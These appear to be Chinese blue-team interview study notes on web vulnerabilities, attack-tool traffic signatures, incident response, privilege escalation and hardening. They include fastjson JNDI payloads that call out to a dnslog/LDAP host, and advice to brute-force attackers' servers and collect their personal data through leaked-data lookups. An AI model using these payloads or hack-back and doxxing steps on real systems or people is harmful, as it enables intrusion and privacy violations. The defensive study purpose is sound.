<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>xss盲打是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入的带有真实攻击行为的xss代码数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的真实攻击功能。</p>
<h3 id="log4j漏洞"><a href="#log4j漏洞" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><p>构造以下payload（content-type字段为application&#x2F;json），利用dnslog平台接收：{“zeo”:{“@type”:”java.net.Inet4Address”,”val”:”ntel8h.dnslog.cn”}}（不同版本，payload不同。推荐这种方式）</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;b&quot;:&#123;
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,
        &quot;autoCommit&quot;:true
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLog的综合利用 (qq.com)</a></p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a>weblogic漏洞</h3><p>在weblogic里面其实反序列化漏洞利用中大致分为两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞。</p>
<p>1.直接通过<strong>T3协议</strong>发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)<br>2.利用<strong>T3协议</strong>配合<strong>RMP</strong>或<strong>ND接口</strong>反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用<strong>IIOP协议</strong>的CVE-2020-2551<br>3.通过 javabean <strong>XML</strong>方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p>
<p><strong>xml：</strong>是因为<strong>xmldecode</strong>解析导致的反序列化，他的包就是一个很大的xml格式内容</p>
<h3 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3><p>请求包里发送恶意js格式的payload，在处理json对象的时候没有过滤@type字段，从而使fastjson通过字段传入一个类，在执行时进而实行构造恶意函数。</p>
<h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><strong>shiro550：</strong></p>
<p><strong>关键词：RememberMe</strong></p>
<p>存在一个忘记密码功能，用户信息会进行加密，而这一个过程中密钥出现了问题，使用密钥进行碰撞并且不需要cookie，从而构造反序列化rce，进而攻击。</p>
<p><strong>shiro721:</strong></p>
<p>shiro721利用的前提就是存在cookie，构造cookie值进行rce。</p>
<h3 id="log4j漏洞-1"><a href="#log4j漏洞-1" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><p>Log4j2 组件在处理程序日志记录时存在JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2 组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<p><strong>特征：</strong>${xxxxxx}</p>
<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h3 id="cs流量特征："><a href="#cs流量特征：" class="headerlink" title="cs流量特征："></a><strong>cs流量特征：</strong></h3><p>对比正常的http流量，CS的http通信流量具有以下几个特征： </p>
<p>A. <strong>心跳包特征</strong> </p>
<p>a) 间隔一定时间，均有通信，且流级上的上下行数据长度固定； </p>
<p>B. <strong>域名&#x2F;IP特征</strong> </p>
<p>a) 未走CDN、域前置的，域名及IP暴露</p>
<p>b) 走CDN、域前置的，真实IP会被隐藏； </p>
<p>C. <strong>指令特征</strong> </p>
<p>a) 下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。 </p>
<p>b) 指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。 </p>
<p>c) 不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。 </p>
<p>D. <strong>数据特征</strong> </p>
<p>a) 在请求的返回包中，通信数据均隐藏在jqeury*.js中。</p>
<h3 id="MSF流量特征："><a href="#MSF流量特征：" class="headerlink" title="MSF流量特征："></a><strong>MSF流量特征：</strong></h3><p>1，端口号：msf默认使用4444端口作为反向连接端口</p>
<p>2，数据内容：msf数据包通常包含特定字符串:(“meterpreter”、”revshell”等)</p>
<h3 id="冰蝎流量特征"><a href="#冰蝎流量特征" class="headerlink" title="冰蝎流量特征:"></a><strong>冰蝎流量特征:</strong></h3><p><strong>冰蝎2.0和3.0区别：</strong></p>
<p><strong>1，加密方式不同，一个是RC4加密，一个AES加密。</strong></p>
<p><strong>2，编写语言不同，2.0采用的是c++，3.0采用的是java。</strong></p>
<p><strong>3，冰蝎流量检测，无论是get请求还是post请求，</strong>content-type都为<strong>application&#x2F;octet-stream</strong>。</p>
<p>冰蝎4.0流量分析：1，十种ua头，可关键字拦截ua头进行匹配拦截。</p>
<p>2，流量特征，Content-type: Application&#x2F;x-www-form-urlencoded。</p>
<p>3，accept字段：Accept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>
<p>（4.0我也不太明白，自己网上多查查资料吧）</p>
<h3 id="哥斯拉流量特征"><a href="#哥斯拉流量特征" class="headerlink" title="哥斯拉流量特征:"></a><strong>哥斯拉流量特征:</strong></h3><p>1，强特征：cookie字段，最后一个Cookie的值出现  “**;**”（尾值出现分号）</p>
<p>2，paylod特征：jsp会出现xc,pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马。</p>
<h3 id="菜刀流量特征："><a href="#菜刀流量特征：" class="headerlink" title="菜刀流量特征："></a><strong>菜刀流量特征：</strong></h3><p>1，请求包中：ua头为百度，火狐</p>
<p>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的数值</p>
<p>4.伪造X-Forwarded-For头</p>
<h3 id="蚁剑流量分析："><a href="#蚁剑流量分析：" class="headerlink" title="蚁剑流量分析："></a><strong>蚁剑流量分析：</strong></h3><p>1，payload特征：Php中使用assert，eval执行；asp 使用eval；在jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征。</p>
<p>2，流量特征：每个请求体都在：@ini_set(“diplay_erors”,“0”);@set_time_limit(0)开头。并且后面存在base64等字符</p>
<h2 id="常见的中间件漏洞"><a href="#常见的中间件漏洞" class="headerlink" title="常见的中间件漏洞"></a>常见的中间件漏洞</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span>漏洞、短文件名猜解、远程代码执行、解析漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">解析漏洞、目录遍历<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">文件解析、目录遍历、<span class="token constant">CRLF</span>注入、目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">远程代码执行、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">反序列化漏洞、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">反序列化漏洞
SSRF任意文件上传
war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2 id="内存马查找"><a href="#内存马查找" class="headerlink" title="内存马查找"></a>内存马查找</h2><p><strong>windows：</strong>看看dll文件，注册表，查看外联可以的vps的地址。</p>
<p>**linux:**使用命令进行遍历。</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h3><p>在拿到一个url时，先确定自己的渗透目标，是要测试整个网站还是某个模块。自己要干什么首先要想清楚。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>此阶段是渗透测试中最基础也是最关键的一步，信息收集的多少一定程度上决定是否能够渗透成功。信息收集过程中可以借助<strong>搜索引擎</strong>（fofa，钟馗之眼）获得一些重要信息。比如后台，敏感的url等。</p>
<p>通过域名找到IP，子域名，旁站，是否存在CDN。<strong>（站长工具）</strong></p>
<p>探测网站相关版本信息，如果网站用了cms，那就查找cms指纹，查找该cms是否存在漏洞。</p>
<p><strong>旁站</strong>：与本网站公用一个服务器。</p>
<p><strong>C段（护网中较有意义）</strong>：C段指的是同一内网段内的其他服务器。</p>
<p>等等。</p>
<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>对网站进行漏洞探测，可以使用相关工具（不问不说：AWVS,Appscan,Nessuss）。扫描到漏洞的话进行漏洞验证利用。</p>
<p>顺利的话最终拿到webshell。</p>
<p>测试结束后总结整个流程，给相关机构提出修复建议。</p>
<h3 id="拿到网站登录框该怎么下手"><a href="#拿到网站登录框该怎么下手" class="headerlink" title="拿到网站登录框该怎么下手"></a>拿到网站登录框该怎么下手</h3><p>首先分析登录框的参数。</p>
<p>尝试弱口令登录，能够进行爆破的话进行爆破。</p>
<p>SQL注入在登陆框也容易出现，如果存在sql注入漏洞的话那就进行攻击。</p>
<h2 id="溯源的思路"><a href="#溯源的思路" class="headerlink" title="溯源的思路"></a>溯源的思路</h2><p>1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，<br>因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。<br>1.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
<p>4.已经被上传webshell应急<br>2.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.<br>(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析.<br>(windows)的话就看启动项和进程.<br>如果是web入侵,看日志web服务是不是安全?还原攻击的流程.<br>5.流量溯源<br>1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门改补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</p>
<h2 id="溯源反制的思路？"><a href="#溯源反制的思路？" class="headerlink" title="溯源反制的思路？"></a><strong>溯源反制的思路？</strong></h2><p>1.攻击源捕获</p>
<ul>
<li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li>
<li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li>
<li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li>
<li>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</li>
<li>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</li>
</ul>
<p> 2.溯源反制</p>
<ul>
<li>IP 定位技术<br>根据IP定位物理地址–代理   IP<br>溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</li>
<li>ID 追踪术<br>ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配<br>溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</li>
<li>网站 url<br>域名 Whois 查询–注册人姓名、地址、电话和邮箱   –域名隐私保护<br>溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</li>
<li>恶意样本分析<br>提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析<br>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</li>
<li>社交账号<br>基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等<br>利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</li>
</ul>
<p> 3.攻击者画像</p>
<ul>
<li>攻击路径</li>
</ul>
<p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等<br>网络代理：代理 IP、跳板机、C2 服务器等<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p>
<ul>
<li>攻击者身份画像</li>
</ul>
<p>虚拟身份：ID、昵称、网名<br>真实身份：姓名、物理位置<br>联系方式：手机号、qq&#x2F;微信、邮箱<br>组织情况：单位名称、职位信息</p>
<h2 id="研判的思路？"><a href="#研判的思路？" class="headerlink" title="研判的思路？"></a><strong>研判的思路？</strong></h2><p>1.首先对<strong>攻击的来源</strong>进行判断，是内对内，外对内还是内对外的情况。</p>
<p>2.依据设备的告警信息结合具体情况来分析<strong>攻击行为的类型</strong>，比如说告警SQL注入攻击，那我们就去查看一下请求数据包里面是否有单引号，SELECT等敏感字符，返回数据包里面是否有SQL语法报错等信息，有的话就可以初步判断该攻击行为是SQL注入攻击。</p>
<p>3.然后就是<strong>根据攻击特征来分析</strong>攻击行为使用了什么技术或者说工具，比如说攻击的频率，数据包的信息等等。比如说在使用AWVS或者APPSCAN等工具在扫描的时候，很有可能在请求数据包的user-agent里面就有相关的信息。同样结合告警信息和具体情况来判断攻击行为的危害程度，比如说检测到多条攻击成功告警和内对内及内对外攻击告警，这个时候就需要尽快的交给应急组了。</p>
<p>4.结合设备告警信息及具体情况<strong>分析攻击意图</strong>，比如说攻击者的目标是主站还是旁站，是主机还是域控，不同的攻击意图对于后续的处理也不同。</p>
<p>5.最后根据我们掌握的信息采<strong>取相应的处置</strong>方式，比如说告警信息是误报，说明设备需要策略优化，不需要处置。告警信息是尝试攻击，暂时对资产没有影响，就需要后续持续关注，攻击成功时能够做到及时上报。如果告警确认不是误报，并且攻击成功时，我们就需要迅速上报及时采取应急响应。</p>
<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="应急响应基本流程"><a href="#应急响应基本流程" class="headerlink" title="应急响应基本流程"></a>应急响应基本流程</h3><p>1.首先应该是<strong>信息收集</strong>，比如说影响范围有多大，事件类型是什么，源头主机和攻击意图，是否需要保障业务等等信息，这一步可以帮助我们更有效的进行下一步的阻断攻击行为。</p>
<p>2.接下来就是<strong>结合已知的信息阻断攻击行为，保护资产</strong>。比如说攻击行为局限于某个站点，且未造成较大损失，那我们可以直接封掉攻击者的IP来确保业务的正常进行，当然之后也要对这个站点有一个持续的关注。如果是某台主机沦陷或者说域控服务器沦陷，那么这就算比较重大的损失，为了避免损失扩大，应该及时将感染设备断网处理。如果有备份服务器，可以切换备用设备来保障业务正常。</p>
<p>3.<strong>对攻击行为阻断后需要对数据进行保护</strong>，比如说保存好流量、可疑进程的内存、失陷系统镜像、恶意样本、设备的日志，这一步可以有效帮助我们后续的溯源工作。</p>
<p>4.<strong>安全事件影响根除</strong>，工具结合手工从系统用户是否有新增用户，进程信息，计划任务，自启动项，注册表，端口状态(是否有对外连接)等方面来检查是否有可疑行为，比如说火绒剑，ProcessHacker等专门用于分析这些方面的工具。如果有就直接关闭或者删除，有一些顽固进程或者顽固文件无法关闭或者删除可以结合专杀工具处理，比如说Rkhunter,火绒等工具。</p>
<p>5.<strong>恢复业务</strong>，加强安全措施，加固系统等，比如说更新软件版本，安装已知漏洞的补丁，关闭某些端口等等，暂时没有解决办法的可以根据业务需求关闭某些服务。<br>6.最后就是输出报告，总结反思。</p>
<h3 id="应急响应案例"><a href="#应急响应案例" class="headerlink" title="应急响应案例"></a>应急响应案例</h3><p>我拿个之前的应急排查来说吧，就是我们这边接到通知他们公司几台服务器有问题，让我们去检测。然后看到是windows的机子，本地用户和组排查的时候发现新建可疑的用户，确定主机是有问题的，对方已经拿到主机权限,然后事件管理器有大量的登录日志爆破，采取的措施是直接删除可疑的和隐藏账号,排查登录日志,确定系统账号已经不安全,更新了管理员账号,对启动项和可疑进程做了清除,取了一份样本拿去分析,通告上级紧急修补web站点的漏洞.</p>
<h3 id="内网隧道："><a href="#内网隧道：" class="headerlink" title="内网隧道："></a>内网隧道：</h3><p>tcp隧道：基础的 TCP 映射，适用于大多数服务，例如<strong>远程桌面、SSH</strong></p>
<p>udp隧道：基础的 UDP 映射，适用于域名解析、部分基于 UDP 协议的<strong>游戏</strong></p>
<p>http：搭建网站专用映射，通过 80 端口访问</p>
<p>https：带有 SSL 加密的网站映射，通过 443 端口访问，映射目标需要支持 SSL</p>
<h3 id="护网时对IP的判断"><a href="#护网时对IP的判断" class="headerlink" title="护网时对IP的判断"></a>护网时对IP的判断</h3><p>如果该IP在护网期间频繁出现，而护网之前基本上未出现过，那么改IP很有可能是红队IP。即封锁该IP。</p>
<p>护网中封锁红队IP的方法有以下几种：</p>
<ol>
<li><p>使用防火墙（<strong>WAF</strong>）：防火墙可以设置规则，将红队IP加入黑名单，从而禁止它们访问受保护的网络或系统。</p>
</li>
<li><p>使用入侵检测系统（<strong>IDS</strong>）：入侵检测系统可以监测网络流量和系统行为，当检测到红队IP的攻击行为时，可以自动将其加入黑名单或者阻止其访问。</p>
</li>
<li><p>使用反向代理（常见的有CF）：在反向代理服务器上设置规则，当检测到红队IP的攻击行为时，可以将其请求重定向到一个错误页面或者进行拦截。</p>
</li>
<li><h5 id="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"><a href="#使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。" class="headerlink" title="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"></a>使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。</h5></li>
</ol>
<h2 id="敏感事件id"><a href="#敏感事件id" class="headerlink" title="敏感事件id:"></a>敏感事件id:</h2><p>4624 登录成功<br>4625 登录失败<br>4634 注销成功<br>4647 用户启动的注销<br>4672 使用超级用户&#x2F;管理员用户进行登录<br>4720 创建用户</p>
<h2 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h2><p>挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p>
<p>攻击者通过各种手段将挖矿程序植入受害者的计算机中，在受害者不知情的情况下利用其计算机的云算力进行挖矿，从而获取利益，这类非法植入用户计算机的挖矿程序就是挖矿木马。</p>
<h2 id="蠕虫感染"><a href="#蠕虫感染" class="headerlink" title="蠕虫感染"></a>蠕虫感染</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>蠕虫病毒的程序结构通常包括三个模块： [3] </p>
<p>(1)传播模块：负责蠕虫的传播，它可以分为扫描模块、攻击模块和复制模块三个子模块。其中，扫描模块负责探测存在漏洞的主机；攻击模块按漏洞攻击步骤自动攻击找到的对象；复制模块通过原主机和新主机交互将蠕虫程序复制到新主机并启动。 [3] </p>
<p>(2)隐藏模块：侵入主机后，负责隐藏蠕虫程序。 [3] </p>
<p>(3)目的功能模块：实现对计算机的控制、监视或破坏等。 [3] </p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>根据蠕虫病毒的程序其工作流程可以分为漏洞扫描、攻击、传染、现场处理四个阶段，首先蠕虫程序随机(或在某种倾向性策略下)选取某一段IP地址，接着对这一地址段的主机扫描，当扫描到有漏洞的计算机系统后，将蠕虫主体迁移到目标主机。然后，蠕虫程序进入被感染的系统，对目标主机进行现场处理。同时，蠕虫程序生成多个副本，重复上述流程。各个步骤的繁简程度也不同，有的十分复杂，有的则非常简单。</p>
<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><p>勒索病毒：能对用户文件进行加密的病毒。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p>
<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</p>
<h2 id="内网黄金票据原理"><a href="#内网黄金票据原理" class="headerlink" title="内网黄金票据原理"></a>内网黄金票据原理</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br>Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<h2 id="黄金票据和白银票据的区别？"><a href="#黄金票据和白银票据的区别？" class="headerlink" title="黄金票据和白银票据的区别？"></a>黄金票据和白银票据的区别？</h2><p><strong>获取的权限不同</strong><br>金票:伪造的TGT，可以获取任意Kerberos的访问权限</p>
<p>银票:伪造的ST，只能访问指定的服务，如CIFS<br><strong>认证流程不同</strong><br>金票: 同KDC交互，但不同AS交互<br>银票:不同KDC交互，直接访问Server<br><strong>加密方式不同</strong><br>金票: 由krbtgt NTLM Hash 加密<br>银票: 由服务账号 NTLM Hash 加密</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h3><p>1.通过 su 命令暴破 root 密码</p>
<p>2.内核漏洞提权</p>
<p>3.SUID提权：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限</p>
<p>4.find：find实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</p>
<h3 id="window提权"><a href="#window提权" class="headerlink" title="window提权"></a>window提权</h3><p><strong>1、系统内核溢出漏洞提权</strong></p>
<p><strong>#手工查找补丁情况</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #查看补丁
wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>#MSF后渗透扫描</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2、at命令利用</strong></p>
<p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将权限提升至system权限。</strong></p>
<p><strong>3.数据库提权</strong></p>
<pre class="line-numbers language-none"><code class="language-none">udf提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。
mof提权：在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>4.MS14-068 域用户提权漏洞</strong></p>
<p>服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020">域控</a>dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。</p>
<h2 id="主机加固"><a href="#主机加固" class="headerlink" title="主机加固"></a>主机加固</h2><h3 id="Linux加固"><a href="#Linux加固" class="headerlink" title="Linux加固"></a>Linux加固</h3><p>**1.**修改ssh的配置文件，禁止root直接登录</p>
<p>**2.**修改密码策略配置文件，确保密码最小长度为8位</p>
<p>**3.**确保错误登录3次，锁定此账户5分钟</p>
<p>**4.**禁止su非法提权，只允许root和wheel组用户su到root</p>
<p>**5.**不响应ICMP请求</p>
<p>**6.**设置登陆超时时间为10分钟</p>
<p><strong>7.</strong> 结束非法登录用户</p>
<h3 id="Windows加固"><a href="#Windows加固" class="headerlink" title="Windows加固"></a><strong>Windows加固</strong></h3><p><strong>1.</strong>  <strong>修改3389端口</strong></p>
<p><strong>2.</strong>  设置安全策略，不允许<strong>SAM</strong>帐户的匿名枚举，不允许SAM帐户和共享的匿名枚举</p>
<p><strong>3.<strong>在组策略中设置</strong>阻止访问注册表编辑工具</strong></p>
<p><strong>4.</strong>  <strong>开启审核对象访问，成功与失败；开启审核目录服务访问，成功与失败；开启审核系统事件，成功与失败</strong></p>
<p><strong>5.</strong>  <strong>禁止445端口漏洞</strong></p>
<p><strong>6.</strong>  <strong>设置屏幕保护在恢复时使用密码保护</strong></p>
<p><strong>7.</strong>  <strong>设置windows密码策略</strong>：使密码必须满足复杂性，设置密码长度最小值为8位，设置密码最长存留期为30天</p>
<p><strong>8.</strong>  开启Windows防火墙，<strong>关闭ping服务</strong>，打开3389、80等服务</p>
<p><strong>9.</strong>  <strong>关闭系统默认共享</strong></p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>分析方法：</p>
<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>b、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开事件查看器。</p>
<p>c、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p>
<h3 id="2-web访问日志"><a href="#2-web访问日志" class="headerlink" title="2.web访问日志"></a>2.web访问日志</h3><p>分析方法：</p>
<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
<p>b、推荐工具：</p>
<ul>
<li>Windows下，推荐使用EmEditor进行日志分析，支持大文本，搜索效率不错。</li>
<li>Linux下，使用Shell命名组合查询分析。</li>
</ul>
<h2 id="正向shell和反向shell"><a href="#正向shell和反向shell" class="headerlink" title="正向shell和反向shell"></a><strong>正向shell和反向shell</strong></h2><p> 正向shell：控制端主动发起连接去连接被控制端<br> 反向shell：被控制端主动连接控制端</p>
<h2 id="防火墙中的DMZ区域，Trust区域，Untrust区域"><a href="#防火墙中的DMZ区域，Trust区域，Untrust区域" class="headerlink" title="防火墙中的DMZ区域，Trust区域，Untrust区域"></a>防火墙中的DMZ区域，Trust区域，Untrust区域</h2><h3 id="DMZ区域（非军事化区）"><a href="#DMZ区域（非军事化区）" class="headerlink" title="DMZ区域（非军事化区）"></a>DMZ区域（非军事化区）</h3><p> 1.两个防火墙之间的空间被称为DMZ。与Internet相比，DMZ可以提供更高的安全性，但是其安全性比内部网络低。<br> 2.服务器 内 外网都可以访问,但还是与内网隔离.<br> 就算是黑客把DMZ服务器拿下,也不能使用服务器来控制内网的网络.起到安全的策略<br>Trust区域，</p>
<h3 id="Trust区域（受信区）"><a href="#Trust区域（受信区）" class="headerlink" title="Trust区域（受信区）"></a>Trust区域（受信区）</h3><p> 可信任的接口.是局域网的接口.此接口外网和DMZ无法访问.<br> 外部不能访问trust口<br> DMZ不能访问trust口</p>
<h3 id="Untrust区域（非受信区）"><a href="#Untrust区域（非受信区）" class="headerlink" title="Untrust区域（非受信区）"></a>Untrust区域（非受信区）</h3><p> 不信任的接口,是用来接internet的,这个接口的信息内网不接受<br> 可以通过untrust口访问DMZ,但不能访问trust口**</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
